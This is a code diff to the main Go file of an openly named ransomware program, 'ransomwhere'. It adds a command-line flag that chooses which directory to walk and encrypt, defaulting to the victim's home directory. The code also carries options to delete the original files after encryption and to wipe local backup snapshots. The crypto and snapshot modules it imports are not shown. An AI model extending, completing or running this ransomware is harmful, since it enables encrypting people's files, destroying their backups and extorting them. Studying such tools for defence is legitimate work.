@@ -1,12 +1,14 @@
 package main
 
 import (
+	"errors"
 	"filippo.io/age"
 	"flag"
 	"github.com/hazcod/ransomwhere/pkg/crypto"
 	"github.com/hazcod/ransomwhere/pkg/file"
 	"github.com/hazcod/ransomwhere/pkg/snapshots"
 	"github.com/sirupsen/logrus"
+	"os"
 	"strings"
 )
 
@@ -20,11 +22,15 @@ func main() {
 	logger := logrus.New()
 	logger.SetLevel(logrus.ErrorLevel)
 
+	// retrieve our current users home directory as a default home directory
+	homeDirectory := file.GetHomeDirectoryWithFallback()
+
 	// commandline flags
 	logLevel := flag.String("log", "error", "The log level to use.")
 	deleteFiles := flag.Bool("delete", false, "Delete files after encrypting.")
 	wipeBackups := flag.Bool("wipe", false, "Wipe local snapshots while encrypting.")
 	opModeFlag := flag.String("mode", "encrypt", "Encrypt or decrypt the ransomware files.")
+	pathFlag := flag.String("path", homeDirectory, "Path to the directory where to traverse files to ransom.")
 	flag.Parse()
 
 	// set our loggers log level
@@ -44,14 +50,16 @@ func main() {
 			Fatalf("unsupported mode selected, use %s or %s", file.OpModeEncrypt, file.OpModeDecrypt)
 	}
 
+	// double-check the directory to traverse exists before walking
+	if _, err := os.Stat(*pathFlag); errors.Is(err, os.ErrNotExist) {
+		logger.WithField("path", *pathFlag).Fatal("directory does not exist")
+	}
+
 	// parse our age identity from the raw embedded private key
 	cryptId, err := age.ParseX25519Identity(privKey)
 	if err != nil {
 		logger.WithError(err).Fatal("could not parse private key")
 	}
-
-	// retrieve our current users home directory to start ransomwaring
-	homeDirectory := file.GetHomeDirectoryWithFallback()
 
 	// if we are encrypting and backup wiping is turned on, start a goroutine in the background
 	// since it can sometimes take a long while to delete all backups
@@ -65,11 +73,11 @@ func main() {
 		}()
 	}
 
-	logger.WithField("mode", opMode).WithField("path", homeDirectory).Info("executing walker")
+	logger.WithField("mode", opMode).WithField("path", *pathFlag).Info("executing walker")
 
 	// start iterating over all files in scope and execute the right functionfor it
-	if err := file.WalkFiles(homeDirectory, logger, func(name, path string) error {
-		fileLogger := logger.WithField("path", path).WithField("name", name)
+	if err := file.WalkFiles(*pathFlag, logger, func(name, path string) error {
+		fileLogger := logger.WithField("path", path)
 
 		// if the file is not in scope, skip it
 		if !file.MatchFile(opMode, name) {
